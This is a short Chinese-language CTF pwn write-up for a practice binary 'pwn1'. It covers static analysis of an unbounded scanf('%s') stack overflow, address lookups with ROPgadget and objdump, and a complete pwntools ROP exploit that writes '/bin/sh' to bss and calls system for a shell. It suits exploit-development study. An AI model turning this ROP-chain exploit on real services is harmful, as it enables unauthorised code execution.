## 0x01 静态分析

### 1.1 F5反编译

```
int sub_804851D()
{
  return system((const char *)0x6F616D69);
}

int __cdecl main()
{
  int v1; // [esp+18h] [ebp-28h]

  puts("pwn test");
  fflush(stdout);
  __isoc99_scanf("%s", &v1);
  printf("%s", &v1);
  return 1;
}
```

### 1.2 漏洞原理

​	scanf未定义变量大小，存在缓冲区溢出，程序内部有system函数，不需要libc来获取system函数真实地址，可以调用scanf("%s",bss地址)将'/bin/sh'字符串放到bss段里，构造执行链：

```
scanf_addr+ppr+%s地址+bss段基址+system_addr+exit_addr+bss段基址
```

## 0x02 编写EXP

### 2.1 查找函数地址

- 查找ppr地址

```
ROPgadget --binary pwn1 --only "pop|pop|ret"
```
ppr_addr = 0x080485ee

- 查找bss地址

```
readelf -S pwn1
```

bss_addr = 0x0804a040

- 查找函数地址

```
objdump -d pwn1
```
system_addr = 0x080483e0

scanf_addr = 0x08048410

format_addr = 0x08048629

### 2.2 EXP

```
from pwn import *

p = process('./pwn1')

ppr_addr = p32(0x080485ee)
bss_addr = p32(0x0804a040)
system_addr = p32(0x080483e0)
scanf_addr = p32(0x08048410)
format_addr = p32(0x08048629)

payload = b'\x90'*52 + scanf_addr + ppr_addr + format_addr + bss_addr + system_addr + b'\x90'*4 + bss_addr

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
```
